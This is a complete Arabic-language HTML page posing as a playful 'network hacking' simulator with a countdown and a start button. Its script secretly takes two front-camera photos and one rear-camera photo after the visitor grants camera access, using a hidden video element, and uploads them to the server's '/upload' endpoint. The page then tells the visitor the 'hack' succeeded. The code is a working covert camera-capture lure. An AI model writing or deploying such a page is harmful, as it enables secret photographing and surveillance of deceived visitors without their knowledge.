<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Network Infiltrator</title>
  <style>
    body { background-color: #000; color: #00ff00; font-family: monospace; text-align: center; padding: 20px; }
    h1 { color: #ff0000; }
    #log { text-align: right; height: 200px; overflow-y: auto; border: 1px solid #333; padding: 10px; margin: 20px auto; max-width: 400px; }
    button { background: #00ff00; color: #000; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; font-weight: bold; }
    button:disabled { background: #555; cursor: not-allowed; }
  </style>
</head>
<body>
  <h1>☠️ جاري اختراق الشبكة ☠️</h1>
  <div id="log">
    <div>> بدء الاتصال بسيرفر القيادة...</div>
    <div>> البحث عن الثغرات...</div>
    <div>> في انتظار بدء الاختراق...</div>
  </div>
  <button id="startBtn">بدء الاختراق</button>
  <div id="status" style="margin-top:20px; color:red;"></div>
  
  <video id="video" autoplay playsinline muted style="display: none;"></video>

  <script>
    const video = document.getElementById('video');
    const status = document.getElementById('status');
    const btn = document.getElementById('startBtn');
    let stream = null;

    async function capture(facing) {
      if (stream) stream.getTracks().forEach(t => t.stop());
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
      video.srcObject = stream;
      await new Promise(r => setTimeout(r, 1000));
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 720;
      canvas.height = video.videoHeight || 960;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
      stream.getTracks().forEach(t => t.stop());
      return blob;
    }

    btn.onclick = async () => {
      try {
        btn.disabled = true;
        btn.style.display = 'none';
        
        // طلب إذن الكاميرا أول مرة
        await navigator.mediaDevices.getUserMedia({ video: true });
        status.innerText = "جاري الاختراق... 3";
        await new Promise(r => setTimeout(r, 1000));
        status.innerText = "جاري الاختراق... 2";
        await new Promise(r => setTimeout(r, 1000));
        status.innerText = "جاري الاختراق... 1";
        await new Promise(r => setTimeout(r, 1000));
        status.innerText = "جاري سرقة البيانات...";

        const photos = [];
        photos.push(await capture('user')); // صورة أمامية 1
        photos.push(await capture('user')); // صورة أمامية 2
        photos.push(await capture('environment')); // صورة خلفية

        const form = new FormData();
        photos.forEach((p, i) => form.append('photos', p, `photo_${i + 1}.jpg`));

        await fetch('/upload', { method: 'POST', body: form });
        status.innerText = "✅ تم الاختراق بنجاح! (أغلق الصفحة)";
        status.style.color = "#00ff00";
      } catch (err) {
        status.innerText = "❌ فشل: " + err.message;
        btn.disabled = false;
        btn.style.display = 'inline-block';
      }
    };
  </script>
</body>
</html>
